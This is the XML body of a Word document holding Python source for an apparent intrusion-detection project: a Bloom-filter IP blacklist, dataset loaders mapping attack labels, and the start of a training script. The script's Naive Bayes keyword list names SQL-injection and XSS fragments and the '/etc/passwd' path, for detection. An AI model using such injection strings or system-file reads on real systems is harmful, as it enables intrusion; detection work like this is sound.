      </w:r>
    </w:p>
    <w:p w14:paraId="533812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2D69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False positives are possible, false negatives never. A k-bit test over an</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E3E7D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m-bit array gives O(k) constant-time lookup independent of how many</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E6C40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addresses the feed holds, which is why a reputation check can sit on the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29FC7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per-packet hot path without breaching the latency budget (NFR-1).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56BDFA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508B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expected false-positive rate for n inserted items is</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19FBDE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8899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~= (1 - e^(-k*n/m))^k</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0963927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F688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and is reported by `false_positive_rate()` so the figure quoted in the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BE00D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evaluation chapter is computed rather than asserted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D601C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1B3FE5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567D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"bloom"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A1127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features = ("source_ip",)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F1D57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A1F3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size=1000, hash_count=3):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17085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self.size = size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3743B8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self.hash_count = hash_count</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0C66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self.bit_array = [0] * size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42B4A0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self.items_added = 0        # counts insert calls, for the FP estimate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2687A1E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5B88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_hashes(self, item):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E99A8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 = str(item).encode("utf-8")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07EAE1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[]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D053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2DB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out.append(zlib.crc32(s) % self.size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="341930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out.append(int(hashlib.md5(s).hexdigest(), 16) % self.size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4573003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DD32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cheap rolling hash so we have a third independent slot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BE53D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0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="146786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ch in s:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62997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 = (h &lt;&lt; 5) + ch</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35BE92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out.append(h % self.size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B1A0D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8542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extend with salted sha1 digests if more than 3 hashes are requested</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="504FD9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 = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="225DBC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len(out) &lt; self.hash_count:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="011FE1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salted = hashlib.sha1(s + b"|" + str(i).encode()).hexdigest()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F1529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out.append(int(salted, 16) % self.size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29DFBA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 += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="070E721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3B9C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out[:self.hash_count]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19EF7A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2FA3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add(self, item):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25A565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self._hashes(item):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55219B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self.bit_array[i] = 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0568B4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self.items_added += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CDCFE2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0EDC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check(self, item):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="063CA5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self._hashes(item):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F9B0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self.bit_array[i] == 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58F63A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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79250A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1D1A6A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7D2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threat intelligence feed --------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71889D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load_feed(self, path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210B7A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"""Load a newline-separated IP blacklist ("threat intelligence feed").</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="507579A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C7ED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Blank lines and lines beginning with '#' are treated as comments so a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21E79E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feed can be annotated with its provenance. Returns the number of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DBF4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indicators loaded, or -1 when the file is missing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F3E12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4B62C7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path or not os.path.isfile(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="278527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threat intel feed not found: %s" % path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A4163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-1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="798A7E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1EEB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loaded = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A457F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open(path, "r", encoding="utf-8", errors="replace") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4746CD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line in f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023812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indicator = line.strip()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C3AE0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not indicator or indicator.startswith("#"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39CFA0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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3FA3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# tolerate "1.2.3.4,comment" and "1.2.3.4 # note" feed styles</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D77F8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indicator = indicator.split(",")[0].split("#")[0].strip()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E7E4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if indicator:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DEA48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self.add(indicator)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE5A6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loaded += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="582954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A24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threat intel: %d indicators loaded from %s (est. FP rate %.4f%%)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="212393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(loaded, os.path.basename(path),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CCEC8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self.false_positive_rate() * 100))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53F371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loaded</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D6375D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AD65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false_positive_rate(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="361E54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"""Measured saturation-based false-positive estimate: (bits_set/m)^k."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="448B51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self.size:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC3D4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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06B47E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fill = sum(self.bit_array) / float(self.size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="556661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fill ** self.hash_count</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53A5F4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90B0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saturation(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C0A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sum(self.bit_array) / float(self.size) if self.size else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F0601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699A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uniform engine interface (NFR-5) ------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22538D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analyse(self, source_ip):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A5B8A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hit = self.check(source_ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24EF89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Verdict(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1472A8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"Blacklisted" if hit else "Unknown",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DA723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confidence=(1.0 - self.false_positive_rate()) if hit else 0.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="600688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detail={"ip": source_ip, "indicators": self.items_added,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="759D4B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"saturation": round(self.saturation(), 4)},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E5EFC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is_threat=hit,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D0C7C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330C5B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0EA6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train(self, samples):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="591516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"""Insert an iterable of indicators (accepts plain IPs or (ip, label))."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="191761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added = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F12A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sample in samples:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EEE86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isinstance(sample, (list, tuple)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FA258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len(sample) &gt; 1 and str(sample[1]).lower() in (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6224CA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"normal", "safe", "benign", "0"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="387259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continue          # only blacklist the malicious rows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15EBAE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sample = sample[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D9E5B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self.add(sample)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F1F59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added += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40AB07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print("[BF ] %d indicators (saturation %.2f%%, est. FP %.4f%%)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4302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(added, self.saturation() * 100,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31CEC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self.false_positive_rate() * 100))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="653FAA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{"indicators": added, "saturation": self.saturation(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="568086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"false_positive_rate": self.false_positive_rate()}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC5EA2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B588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export_brain(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5939F4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bit array is the model; hex-pack it so the JSON stays compact</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F5330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packed = bytes(bytearray(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="557FDE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sum(bit &lt;&lt; (7 - offset) for offset, bit in enumerate(chunk))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25776E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chunk in (self.bit_array[i:i + 8]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71DE7C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for i in range(0, self.size, 8))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F66B2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))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21C832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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="185472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"size": self.size,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC2EC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"hash_count": self.hash_count,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22EA0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"items_added": self.items_added,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="079C00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"bits": packed.hex(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06CB23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A26AD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E853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import_brain(self, data):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03E282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isinstance(data, dict) or "bits" not in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23BB5B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65C50D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self.size = int(data.get("size", self.size))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53B1DB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self.hash_count = int(data.get("hash_count", self.hash_count))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="693A21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self.items_added = int(data.get("items_added", 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="761E89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0C8763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 = bytes.fromhex(data["bits"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="410445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ValueError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BFBD6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676EAB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bits = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB58D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byte in raw:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F086F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offset in range(8):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21AB4D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bits.append((byte &gt;&gt; (7 - offset)) &amp; 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43C668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self.bit_array = bits[:self.size]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA0F3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pad if the packed form was shorter than size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12BA3B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len(self.bit_array) &lt; self.size:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D8712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self.bit_array.append(0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11EED7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Federated Learning: Bloom restored %d indicators."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12C4D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self.items_added)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2470FF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1DF6EA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9F4A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reset(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DEEB1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self.bit_array = [0] * self.size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19171C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self.items_added = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="269AC0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19D738A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A43B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84B9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9DC38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bf = BloomFilter(size=100, hash_count=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="406F28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ip in ["192.168.1.100", "10.0.0.5", "172.16.0.1"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="037F74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bf.add(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB3F0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ip in ["192.168.1.100", "8.8.8.8", "10.0.0.5", "127.0.0.1"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5125BA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print(ip, "-&gt;", "BLACKLISTED" if bf.check(ip) else "clean")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F6CBD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print("saturation=%.2f%% est FP=%.4f%%"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79BA97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(bf.saturation() * 100, bf.false_positive_rate() * 100))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0651DE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D7F4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snap = bf.export_brain()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C03D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restored = BloomFilter(size=100, hash_count=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A06B2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restored.import_brain(snap)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0914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print("round trip ok:", all(restored.check(ip) for ip in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7711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["192.168.1.100", "10.0.0.5", "172.16.0.1"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD59262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Training Pipeline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B5DAD1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src/training/loader.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53C53B9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(150 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="508B14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0290D3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091E97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759CFA3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37246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7B4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NORMAL = {"normal", "benign", "0", "background", "safe"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C811D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SCAN = {"scan", "portscan", "port_scan", "recon", "reconnaissance"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="305238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ATTACK = {"ddos", "dos", "flood", "synflood", "udpflood",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D4CCF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"attack", "malicious", "1", "anomaly"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66BA6F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51A5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415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DatasetError(Exception):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21DD67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pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E6465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25C5F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282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normalise_label(raw):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7205DD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raw is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="660A0E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"Normal"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ACCDD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 = str(raw).strip().lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="105F5A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compact = k.replace("-", "").replace("_", "").replace(" ", "")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="353036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k in NORMAL:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15A5B9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"Normal"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11C5DC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(k in SCAN or "portscan" in compact</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E9A1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or compact.startswith("recon")):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27EB4D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"Scan"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09014C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k in {"malicious", "sqli", "xss", "lfi", "rce", "payload"}:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11D445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"Malicious"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178C28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k in ATTACK:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76F8FE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"Attack"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="494E00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raw.strip().capitalize() or "Normal"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50799C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7256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5F6F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_open(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1542AC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os.path.isfile(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D9AC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DatasetError("file not found: " + path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EAADF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open(path, "r", newline="", encoding="utf-8", errors="ignore")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C5469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5223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27EF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load_knn_csv(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E12C5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[]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="312C58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_open(path) as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D57ED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013446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r.fieldnames:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D6F35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empty header")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E5EFA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r.fieldnames}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CC8F4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need in ("unique_ports", "packet_count", "label"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="245A89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need not in h:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40649F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raise DatasetError(path + ": missing column " + need)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F3CC7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i, row in enumerate(r, start=2):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09BDDD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53E0AD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ports = int(float(row[h["unique_ports"]]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D7EBD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pkts = int(float(row[h["packet_count"]]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="323464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(TypeError, ValueError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F115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raise DatasetError("%s:%d bad number" % (path, i))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76C23E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out.append([ports, pkts, normalise_label(row[h["label"]])])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14EF12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out:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A04A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DatasetError(path + ": no rows")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A6781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7FEB5A2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EF86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FC5D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load_payload_csv(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="219C8E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[]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2637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_open(path) as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B3D86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326737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r.fieldnames:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CD9B1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empty header")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="066A28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r.fieldnames}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31AB00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"payload" not in h or "label" not in h:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0847E6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need payload,label columns")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="496BD4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48C6E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out.append((row[h["payload"]] or "",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11526D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normalise_label(row[h["label"]])))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2238E6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out:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF5D5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DatasetError(path + ": no rows")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21109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139574A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A8CA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7C44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load_kmeans_csv(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2756FB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[]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE8F6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_open(path) as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A3A58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0B519E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r.fieldnames:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5532E2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empty header")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C1B38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r.fieldnames}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B47FF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"pps" not in h or "unique_ports" not in h:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74277E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kmeans CSV requires 'pps' and 'unique_ports' columns.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A2F2C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i, row in enumerate(r, start=2):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC87B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1C29A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out.append([float(row[h["pps"]]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="064873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float(row[h["unique_ports"]])])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2488AC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(TypeError, ValueError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A45C9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raise DatasetError("%s:%d bad number" % (path, i))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525120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out:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D5A99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DatasetError(path + ": no rows")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B689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60C92F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1F3E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9C25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load_cic_iot2023(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F66FD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MANTIS KNN consumes one-second aggregate counts, not raw port numbers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0729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A previous loader incorrectly substituted "Dst Port" for</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76C09F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"unique_ports" and labeled every attack family as Scan. That produced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B91E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invalid training points such as [0 ports, packets, Scan].</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C8C9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knn_rows, km_rows = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF90C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_open(path) as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="005FA4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703374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r.fieldnames:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0104D9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empty header")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32245B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cols = {c.strip().lower(): c for c in r.fieldnames}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37DBCD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label_col = cols.get("label") or cols.get("attack")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06773F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pkts_col = (cols.get("tot fwd pkts") or cols.get("totfwdpkts")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C21C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or cols.get("tot sum") or cols.get("packet_count")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CD487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or cols.get("packets"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6062E0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ports_col = cols.get("unique_ports")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C5452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label_col or not pkts_col:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E280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need Label + packet count col")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61738E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ports_col:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292C3C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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2113FE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path + ": CIC rows must be pre-aggregated with a "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1708B2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"'unique_ports' column; 'Dst Port' is a port number, not a "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43ACC8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"count of scanned ports")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5697AD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13F0C2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165785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pkts = int(float(row[pkts_col] or 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A1EC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ValueError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CFD01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111CD2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19D15A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ports = int(float(row[ports_col] or 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F8D66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ValueError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EB1F5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4C3173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pkts &lt; 0 or ports &lt; 0 or ports &gt; pkts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="202F98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5CFF17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lbl = normalise_label(row[label_col])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="413E2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# This is a scan-vs-not-scan classifier. DDoS, payload attacks,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07623D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and other attack families are negative examples, not scans.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EE39F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tag = "Scan" if lbl == "Scan" else "Normal"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D6189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knn_rows.append([ports, pkts, tag])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01DC74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km_rows.append([float(pkts), float(ports)])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0180BB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knn_rows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42AA6E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DatasetError(path + ": no usable rows")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F61B8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{"knn": knn_rows, "kmeans": km_rows}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02DD79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947D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A87D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load_json(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56F5A0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os.path.isfile(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2825A9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DatasetError("file not found: " + path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47D252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encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB993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C6536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json.load(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01DDA8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json.JSONDecodeError as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F89E2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DatasetError(path + ": bad JSON (%s)" % e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C5F087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src/training/train.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA954B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(168 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E22E8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1C3DC3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trains mantis engines from a csv/json dataset and writes mantis_brain.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08783E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argparse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="080DFC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1B8BD7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5ED6C2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700018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4EC12D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640AAF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Counter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08FB2D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1007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2D05C5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517143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012DA6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4F4BC6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0F41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training import loader</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="494F3B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B09C8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71F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KEYWORDS = ["UNION", "SELECT", "SLEEP", "DROP", "INSERT", "UPDATE",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70B52B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"OR 1=1", "SCRIPT", "ALERT(", "/ETC/PASSWD"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="715A29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F0311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9814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train_knn(rows, max_samples=5000):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74536D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KNN is lazy - just keep the labelled points. Trim if huge.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F8DC6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len(rows) &gt; max_samples:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF6BC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buckets = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60B106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 in rows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="025DB0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buckets.setdefault(r[2], []).append(r)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F3C64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per = max(1, max_samples // max(1, len(buckets)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AE648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kept = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F83B3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items in buckets.values():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A926C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step = max(1, len(items) // per)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4A7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kept.extend(items[::step][:per])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B02CD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rows = kept</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="458B91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counts = Counter(r[2] for r in rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="165B31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print("[KNN] %d samples %s" % (len(rows), dict(counts)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="437F2C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{"k": 3, "training_data": rows}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00D9B4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F772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F183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train_naive_bayes(rows, keywords=None, laplace=1.0):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="695E18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keywords = keywords or KEYWORDS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E189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n_mal = sum(1 for _, l in rows if l in {"Malicious", "Attack"})</w:t>
      </w:r>
    </w:p>
